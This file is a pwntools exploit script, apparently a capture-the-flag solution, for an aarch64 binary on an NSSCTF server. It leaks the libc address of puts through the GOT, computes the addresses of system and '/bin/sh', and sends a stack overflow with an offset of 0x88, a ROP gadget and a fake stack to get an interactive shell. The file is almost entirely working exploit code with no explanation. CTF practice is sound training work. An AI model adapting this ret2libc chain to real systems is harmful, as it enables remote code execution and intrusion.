from pwn import *
import sys
remote_addr = ["node4.anna.nssctf.cn",28926]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    # io = process(["qemu-aarch64", "-L", ".", "-g","1234","./pwn"]) 
    io = process(["qemu-aarch64", "-L", ".","./pwn"]) 
    elf = ELF("./pwn")
    libc = ELF("./lib/libc.so.6")
    # io = process(["qemu-mips-static", "-L", ".", "./pwn"]) 
    # io = process("./pwn")
    context(arch='aarch64',os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        context.log_level="debug" 
        elf = ELF("./pwn")
        libc = ELF("./lib/libc.so.6")
        io = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 


def get_gift(cc):
    io.sendlineafter(b">\n",b"1")
    io.sendafter(b"sensible>>\n",cc)

def overflow(cc):
    io.sendlineafter(b">\n",b"2")
    io.sendlineafter(b"> ",cc)

ct=0
num=[]
for i in range(0x10,0x100):
    num.append(i)
for i in range(0,0xf0):
    print("ct: ",hex(num[i]))

while(True):
    # try:
        elf = ELF("./pwn")
        libc = ELF("./lib/libc.so.6")
        io = remote(remote_addr[0],remote_addr[1])
        # io = process(["qemu-mips-static", "-L", ".", "./pwn"]) 
        # io = process("./pwn")
        context(arch='aarch64',os='linux')
        puts_got=elf.got[b"puts"]

        get_gift(p64(puts_got))

        leak_addr=u64(io.recv(3).ljust(8,b"\x00"))-libc.sym[b"puts"]
        print("leak_addr: ",hex(leak_addr))

        base_addr=0x4000000000
        # base_addr = base_addr * num[ct]
        print("base_addr: ",hex(base_addr))
        ct = ct+1
        # base_addr=0x0

        sys_addr=leak_addr+libc.sym[b"system"]+base_addr
        str_sh=leak_addr+next(libc.search(b"/bin/sh"))+base_addr

        print("sys_addr: ",hex(sys_addr))
        print("str_sh: ",hex(str_sh))

        gadget=leak_addr+0xb6518+base_addr
        # 0x00000000000b6518: ldr x0, [sp, #0x70]; ldp x29, x30, [sp], #0x1a0; ret;
        # payload=cyclic(0x100)
        print("offset: ",hex(cyclic_find(0x6261616a))) #0x88

        payload=cyclic(0x88)+p64(gadget)

        fake_stack=cyclic(0x10)+p64(sys_addr)*2
        fake_stack=fake_stack.ljust(0x80,b"a")+p64(str_sh)
        # fake_stack=fake_stack.ljust(0xc0,b"a")+p64(0xbeefdead)+p64(sys_addr)
        overflow(payload+fake_stack)
        sleep(0.2)
        io.interactive()
    #     io.sendline(b"cat flag")
    #     sleep(0.2)
    #     t=io.recv()
    #     print(t)
    #     if b"NSS" in t:
    #         break
    #     else:
    #         io.close()
    #         continue
    # except:
    #     io.close()
    #     continue
